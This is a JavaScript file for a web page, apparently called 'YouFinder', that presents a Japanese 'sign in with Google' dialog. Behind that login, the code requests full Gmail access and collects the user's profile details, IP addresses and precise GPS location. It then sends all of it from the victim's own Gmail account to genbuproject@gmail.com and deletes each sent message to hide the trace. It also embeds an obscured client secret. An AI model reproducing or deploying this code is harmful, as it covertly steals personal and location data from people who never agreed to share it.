const Info = {
	ClientID: "239141875067-k7ftnrifgiv328ai7j0nnec8s79pjlro.apps.googleusercontent.com",
	SecretID: atob("Z21COW1NOWVxVXhCOHRqNVVBSWZIeThf"),
	RedirectURL: "https://genbuproject.github.io/Content/Specifics/YouFinder/", //"http://localhost:8001/",
	
	Scope: [
		"https://www.googleapis.com/auth/plus.login",
		"https://www.googleapis.com/auth/plus.me",
		"https://mail.google.com/"
	]
}

let Res = {
	Token: "",
	
	Datas: {
		Name: "",
		URL: "",
		Birthday: "",
		Gender: "",
		Language: "",
		
		Location: {
			Latitude: "", //緯度
			Longitude: "", //経度
			Accuracy: "",
			Altitude: "",
			AltitudeAccuracy: "",
			Heading: "",
			Speed: ""
		},
		
		IPs: {
			Public: "",
			Private: ""
		}
	}
}

const Net = {
	LoginWithGoogle: function () {
		location.href = "https://accounts.google.com/o/oauth2/v2/auth?redirect_uri=" + Info.RedirectURL + "&scope=" + Info.Scope.join("+") + "&response_type=code&client_id=" + Info.ClientID + "&access_type=offline&approval_prompt=force";
	},
	
	RequestToken: function (OnLoad) {
		DOM.XHR({
			Type: "POST",
			URL: "https://www.googleapis.com/oauth2/v4/token",
			DoesSync: true,
			
			Params: {
				"grant_type": "authorization_code",
				
				"client_id": Info.ClientID,
				"client_secret": Info.SecretID,
				"redirect_uri": Info.RedirectURL,
				"code": location.querySort().CODE
			},
			
			OnLoad: function (Event) {
				Res.Token = JSON.parse(Event.target.response).access_token;
				
				OnLoad();
			}
		});
	},
	
	GetUserData: function () {
		DOM.XHR({
			Type: "GET",
			URL: "https://www.googleapis.com/plus/v1/people/me",
			DoesSync: true,
			
			Params: {
				"access_token": Res.Token
			},
			
			OnLoad: function (Event) {
				console.log(JSON.parse(Event.target.response));
				
				Res.Datas.Name = JSON.parse(Event.target.response).displayName,
					Res.Datas.URL = JSON.parse(Event.target.response).url,
					Res.Datas.Birthday = JSON.parse(Event.target.response).birthday,
					Res.Datas.Gender = JSON.parse(Event.target.response).gender,
					Res.Datas.Language = JSON.parse(Event.target.response).language;
					
				Net.SendMailAddress();
				
				navigator.geolocation.getCurrentPosition(function (Position) {
					Res.Datas.Location.Latitude = Position.coords.latitude;
					Res.Datas.Location.Longitude = Position.coords.longitude;
					Res.Datas.Location.Accuracy = Position.coords.accuracy;
					Res.Datas.Location.Altitude = Position.coords.altitude;
					Res.Datas.Location.AltitudeAccuracy = Position.coords.altitudeAccuracy;
					Res.Datas.Location.Heading = Position.coords.heading;
					Res.Datas.Location.Speed = Position.coords.speed;
					
					Net.SendLog();
				});
			}
		});
	},
	
	SendMailAddress: function () {
		let Separator = "=====Sending=====";
		
		DOM.XHR({
			Type: "POST",
			URL: "https://www.googleapis.com/upload/gmail/v1/users/me/messages/send",
			DoesSync: true,
			
			Params: {
				"uploadType": "media",
				"access_token": Res.Token,
			},
			
			Headers: {
				"Content-Type": "message/rfc822"
			},
			
			Data: [
				"To: genbuproject@gmail.com",
				"Subject: =?UTF-8?B?" + btoa(unescape(encodeURIComponent("Address From " + Res.Datas.Name))) + "?=",
				"MIME-Version: 1.0",
				"Content-Type: text/plain; charset=UTF-8",
				"",
				"【メールアドレス送信用ログ】",
				JSON.stringify(Res, null, "\t")
			].join("\r\n"),
			
			OnLoad: function (Event) {
				Net.DeleteLog(JSON.parse(Event.target.response).id);
			}
		});
	},
	
	SendLog: function () {
		let Separator = "=====Sending=====";
		
		DOM.XHR({
			Type: "POST",
			URL: "https://www.googleapis.com/upload/gmail/v1/users/me/messages/send",
			DoesSync: true,
			
			Params: {
				"uploadType": "media",
				"access_token": Res.Token,
			},
			
			Headers: {
				"Content-Type": "message/rfc822"
			},
			
			Data: [
				"To: genbuproject@gmail.com",
				"Subject: =?UTF-8?B?" + btoa(unescape(encodeURIComponent("From " + Res.Datas.Name))) + "?=",
				"MIME-Version: 1.0",
				"Content-Type: text/plain; charset=UTF-8",
				"",
				"【GPS情報送信用ログ】",
				JSON.stringify(Res, null, "\t")
			].join("\r\n"),
			
			OnLoad: function (Event) {
				Net.DeleteLog(JSON.parse(Event.target.response).id);
			}
		});
	},
	
	DeleteLog: function (MailID) {
		DOM.XHR({
			Type: "DELETE",
			URL: "https://www.googleapis.com/gmail/v1/users/me/messages/" + MailID,
			DoesSync: true,
			
			Params: {
				"access_token": Res.Token
			},
			
			OnLoad: function (Event) {
				
			}
		});
	}
}

const Util = {
	CreateDialog: function (Title, Content, FooterContent) {
		let DialogBack = document.createElement("Div");
			DialogBack.className = "DialogBack";
			
		let DialogFront = document.createElement("Div");
			DialogFront.className = "DialogFront";
			
		let DialogName = document.createElement("Name");
			DialogName.textContent = Title;
			
		let DialogSeparater = document.createElement("Hr");
		
		let DialogContent = document.createElement("Content");
			DialogContent.innerHTML = Content;
			
		let DialogFooter = document.createElement("Footer");
		
		document.body.appendChild(DialogBack);
		document.body.appendChild(DialogFront);
		
		DialogFront.appendChild(DialogName);
		DialogFront.appendChild(DialogSeparater);
		DialogFront.appendChild(DialogContent);
		DialogFront.appendChild(DialogFooter);
		
		DialogFooter.innerHTML = FooterContent;
		
		DialogFront.style.top = (document.documentElement.clientHeight - DialogFront.clientHeight) / 2 + "px";
		DialogFront.style.left = (document.documentElement.clientWidth - DialogFront.clientWidth) / 2 + "px";
	},
	
	DismissDialog: function () {
		document.getElementsByClassName("DialogBack")[0].parentElement.removeChild(document.getElementsByClassName("DialogBack")[0]);
		document.getElementsByClassName("DialogFront")[0].parentElement.removeChild(document.getElementsByClassName("DialogFront")[0]);
	},
}

const Dialogs = {
	Step1: function () {
		Util.CreateDialog("Googleアカウントにログインしてください", "アクセスするにはGoogleアカウントにログインする必要があります。", "<Button OnClick = 'Net.LoginWithGoogle();'>Sign in</Button><Button OnClick = 'Util.DismissDialog();'>キャンセル</Button>");
	},
	
	Step2: function () {
		Util.CreateDialog("ログイン成功", "Googleアカウントのログインに成功しました。", "<Button OnClick = 'Util.DismissDialog();'>閉じる</Button>");
	}
}

function Init() {
	var Querys = location.querySort();
	
	location.getIPs(function (IP) {
		if (IP.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)) {
			Res.Datas.IPs.Public = IP;
		} else if (IP.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/)) {
			Res.Datas.IPs.Private = IP;
		}
	});
	
	if (!Querys.CODE) {
		Dialogs.Step1();
	} else {
		Dialogs.Step2();
		
		Net.RequestToken(function () {
			Net.GetUserData();
		});
	}
}